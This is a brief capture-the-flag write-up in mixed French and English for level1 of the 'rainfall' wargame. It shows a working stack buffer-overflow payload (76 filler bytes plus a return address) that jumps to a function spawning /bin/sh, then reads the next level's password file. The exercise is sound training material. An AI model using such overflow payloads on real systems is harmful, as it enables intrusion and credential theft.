dans la vm rainfall en ssh

on voit un buffer de 76 et un appel de gets ensuite,
on trouve une fonction run() qui execute system("/bin/sh")

elle est a l'addresse 0x08048444

on prepare donc un notre string en raw bytes dans un fichier
python -c "print 'A' * 76 + \"\x44\x84\x04\x08\""  > /tmp/input.txt

cat /tmp/input.txt - | ./level1

this send the content of input.txt in the standard output and open stdin in level1
so we get the shell

then try cat /home/user/level2/.pass
